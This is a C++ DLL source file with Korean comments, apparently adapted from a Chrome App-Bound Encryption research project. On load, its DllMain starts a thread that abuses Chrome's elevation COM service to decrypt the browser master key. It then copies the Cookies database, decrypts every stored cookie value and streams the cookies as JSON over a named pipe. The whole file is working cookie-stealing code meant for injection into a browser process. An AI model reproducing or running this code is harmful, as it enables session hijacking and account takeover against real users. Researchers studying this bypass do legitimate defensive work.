// dllmain.cpp (v9.1, All Compiler Errors Fixed)
// 원본: xaitax/chrome-app-bound-encryption-decryption/src/chrome_decrypt.cpp

// =================================================================
// 0. 필수 헤더, 라이브러리 및 전역 정의
// =================================================================

// Visual Studio 프로젝트에서는 이 줄이 반드시 파일의 가장 처음에 와야 합니다.
#include "pch.h"

// --- NTSTATUS 및 NT_SUCCESS 정의 (pch.h 바로 다음에 위치) ---
#ifndef NTSTATUS
typedef long NTSTATUS;
#endif

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
// ---

#define NOMINMAX

// --- 표준 및 Windows 헤더 ---
#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <wrl/client.h>
#include <bcrypt.h>
#include <string>
#include <vector>
#include <memory>
#include <stdexcept>
#include <filesystem> // C++17 이상 필요
#include <fstream>
#include <sstream>
#include <iomanip>
#include <algorithm>

// --- 외부 라이브러리 (프로젝트에 포함 필요) ---
#include "sqlite3.h"
#include "json.hpp"

// --- 라이브러리 링크 ---
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "shell32.lib")

// --- 전역 네임스페이스 및 타입 정의 ---
namespace fs = std::filesystem;
using json = nlohmann::json;
using byte = unsigned char;


// =================================================================
// 1. COM 인터페이스 정의 (ABE 통신용)
// =================================================================
enum class ProtectionLevel { None = 0, PathValidationOld = 1, PathValidation = 2, Max = 3 };
MIDL_INTERFACE("A949CB4E-C4F9-44C4-B213-6BF8AA9AC69C")
IOriginalBaseElevator : public IUnknown{
public:
    virtual HRESULT STDMETHODCALLTYPE RunRecoveryCRXElevated(const WCHAR*, const WCHAR*, const WCHAR*, const WCHAR*, DWORD, ULONG_PTR*) = 0;
    virtual HRESULT STDMETHODCALLTYPE EncryptData(ProtectionLevel, const BSTR, BSTR*, DWORD*) = 0;
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BSTR, BSTR*, DWORD*) = 0;
};


// =================================================================
// 2. 핵심 복호화 로직 (Payload 네임스페이스)
// =================================================================
namespace Payload {

    // --- 유틸리티 함수 ---
    namespace Utils {
        fs::path GetLocalAppDataPath() {
            PWSTR path = nullptr;
            if (SUCCEEDED(SHGetKnownFolderPath(FOLDERID_LocalAppData, 0, NULL, &path))) {
                fs::path result_path(path);
                CoTaskMemFree(path);
                return result_path;
            }
            throw std::runtime_error("Failed to get Local AppData path.");
        }

        std::vector<byte> Base64Decode(const std::string& input) {
            DWORD size = 0;
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr)) return {};
            std::vector<byte> data(size);
            if (!CryptStringToBinaryA(input.c_str(), 0, CRYPT_STRING_BASE64, data.data(), &size, nullptr, nullptr)) return {};
            return data;
        }
    }

    // --- 암호화 관련 기능 ---
    namespace Crypto {
        std::vector<byte> DecryptGcm(const std::vector<byte>& key, const std::vector<byte>& blob) {
            size_t data_offset = 0;
            if (blob.size() > 3 && blob[0] == 'v') {
                data_offset = 3;
            }

            if (blob.size() < data_offset + 12 + 16) return {};

            BCRYPT_ALG_HANDLE hAlg = nullptr;
            if (!BCRYPT_SUCCESS(BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0))) return {};

            BCRYPT_KEY_HANDLE hKey = nullptr;
            std::vector<byte> plain;

            BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
            if (BCRYPT_SUCCESS(BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, (PUCHAR)key.data(), (ULONG)key.size(), 0))) {
                const byte* iv = blob.data() + data_offset;
                const byte* ct = iv + 12;
                const byte* tag = blob.data() + blob.size() - 16;
                ULONG ct_len = static_cast<ULONG>(blob.size() - data_offset - 12 - 16);

                BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo;
                BCRYPT_INIT_AUTH_MODE_INFO(authInfo);
                authInfo.pbNonce = (PUCHAR)iv;
                authInfo.cbNonce = 12;
                authInfo.pbTag = (PUCHAR)tag;
                authInfo.cbTag = 16;

                plain.resize(ct_len > 0 ? ct_len : 1);
                ULONG outLen = 0;
                NTSTATUS status = BCryptDecrypt(hKey, (PUCHAR)ct, ct_len, &authInfo, nullptr, 0, plain.data(), (ULONG)plain.size(), &outLen, 0);
                if (NT_SUCCESS(status)) {
                    plain.resize(outLen);
                }
                else {
                    plain.clear();
                }
                BCryptDestroyKey(hKey);
            }
            BCryptCloseAlgorithmProvider(hAlg, 0);
            return plain;
        }

        std::vector<byte> GetEncryptedMasterKey(const fs::path& localStatePath) {
            std::ifstream f(localStatePath);
            if (!f) throw std::runtime_error("Could not open Local State file: " + localStatePath.string());

            json state;
            f >> state;

            std::string key_b64 = state["os_crypt"]["encrypted_key"];
            auto decoded = Utils::Base64Decode(key_b64);

            if (decoded.size() > 4 && memcmp(decoded.data(), "APPB", 4) == 0) {
                return { decoded.begin() + 4, decoded.end() };
            }
            if (decoded.size() > 5 && memcmp(decoded.data(), "DPAPI", 5) == 0) {
                return { decoded.begin() + 5, decoded.end() };
            }
            throw std::runtime_error("Unknown key prefix.");
        }
    }

    // --- 파이프 통신 클래스 ---
    class PipeLogger {
    public:
        PipeLogger(LPCWSTR pipeName) {
            m_pipe = CreateFileW(pipeName, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
        }
        ~PipeLogger() {
            if (isValid()) {
                Log("\n__DLL_PIPE_COMPLETION_SIGNAL__\n");
                CloseHandle(m_pipe);
            }
        }
        bool isValid() const { return m_pipe != INVALID_HANDLE_VALUE; }
        void Log(const std::string& message) {
            if (isValid()) {
                DWORD bytesWritten = 0;
                WriteFile(m_pipe, message.c_str(), static_cast<DWORD>(message.length()), &bytesWritten, nullptr);
            }
        }
    private:
        HANDLE m_pipe = INVALID_HANDLE_VALUE;
    };

    // --- 메인 오케스트레이터 ---
    void DecryptionOrchestrator(LPCWSTR pipeName) {
        PipeLogger logger(pipeName);
        if (!logger.isValid()) return;

        try {
            CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
            logger.Log("[+] COM library initialized.\n");

            fs::path userDataRoot = Utils::GetLocalAppDataPath() / "Google\\Chrome\\User Data";
            logger.Log("[*] Target User Data: " + userDataRoot.string() + "\n");

            auto encryptedKey = Crypto::GetEncryptedMasterKey(userDataRoot / "Local State");
            logger.Log("[*] Encrypted master key loaded.\n");

            Microsoft::WRL::ComPtr<IOriginalBaseElevator> elevator;
            CLSID clsid_chrome = { 0x708860E0, 0xF641, 0x4611, {0x88, 0x95, 0x7D, 0x86, 0x7D, 0xD3, 0x67, 0x5B} };
            IID iid_chrome = { 0x463ABECF, 0x410D, 0x407F, {0x8A, 0xF5, 0x0D, 0xF3, 0x5A, 0x00, 0x5C, 0xC8} };

            HRESULT hr = CoCreateInstance(clsid_chrome, nullptr, CLSCTX_LOCAL_SERVER, iid_chrome, &elevator);
            if (FAILED(hr)) throw std::runtime_error("CoCreateInstance failed.");

            BSTR bstrEncKey = SysAllocStringByteLen(reinterpret_cast<const char*>(encryptedKey.data()), (UINT)encryptedKey.size());
            BSTR bstrPlainKey = nullptr;
            DWORD comErr = 0;

            hr = elevator->DecryptData(bstrEncKey, &bstrPlainKey, &comErr);
            SysFreeString(bstrEncKey);
            if (FAILED(hr)) throw std::runtime_error("IElevator->DecryptData failed.");

            std::vector<byte> masterKey(SysStringByteLen(bstrPlainKey));
            memcpy(masterKey.data(), bstrPlainKey, masterKey.size());
            SysFreeString(bstrPlainKey);
            logger.Log("[+] Master key decrypted via ABE COM server.\n");

            fs::path dbPath = userDataRoot / "Default" / "Network" / "Cookies";

            fs::path tempDbPath = fs::temp_directory_path() / "temp_cookies.db";
            std::error_code ec;
            fs::copy_file(dbPath, tempDbPath, fs::copy_options::overwrite_existing, ec);
            if (ec) throw std::runtime_error("Failed to copy database file.");

            sqlite3* db;
            sqlite3_open(tempDbPath.string().c_str(), &db);
            sqlite3_stmt* stmt;
            sqlite3_prepare_v2(db, "SELECT host_key, name, path, is_secure, expires_utc, encrypted_value FROM cookies", -1, &stmt, NULL);

            json cookies_json = json::array();
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const byte* blob = (const byte*)sqlite3_column_blob(stmt, 5);
                int size = sqlite3_column_bytes(stmt, 5);
                auto plain_value = Crypto::DecryptGcm(masterKey, { blob, blob + size });
                if (!plain_value.empty()) {
                    json c;
                    c["host"] = (const char*)sqlite3_column_text(stmt, 0);
                    c["name"] = (const char*)sqlite3_column_text(stmt, 1);
                    c["path"] = (const char*)sqlite3_column_text(stmt, 2);
                    c["secure"] = sqlite3_column_int(stmt, 3) == 1;
                    c["expires"] = sqlite3_column_int64(stmt, 4);
                    c["value"] = std::string(plain_value.begin(), plain_value.end());
                    cookies_json.push_back(c);
                }
            }
            sqlite3_finalize(stmt);
            sqlite3_close(db);
            fs::remove(tempDbPath, ec);

            if (!cookies_json.empty()) {
                logger.Log(cookies_json.dump(2));
            }
            else {
                logger.Log("[-] No cookies were decrypted.\n");
            }

            CoUninitialize();
            logger.Log("[*] Decryption process finished.\n");

        }
        catch (const std::exception& e) {
            logger.Log("[-] CRITICAL DLL ERROR: " + std::string(e.what()) + "\n");
        }
    }
}

// =================================================================
// 3. DLL 진입점 (DllMain)
// =================================================================
DWORD WINAPI DecryptionThreadWorker(LPVOID lpParam) {
    if (lpParam) {
        LPCWSTR pipeName = static_cast<LPCWSTR>(lpParam);
        Payload::DecryptionOrchestrator(pipeName);
    }
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH: {
        HANDLE hThread = CreateThread(NULL, 0, DecryptionThreadWorker, lpReserved, 0, NULL);
        if (hThread) {
            CloseHandle(hThread);
        }
        break;
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}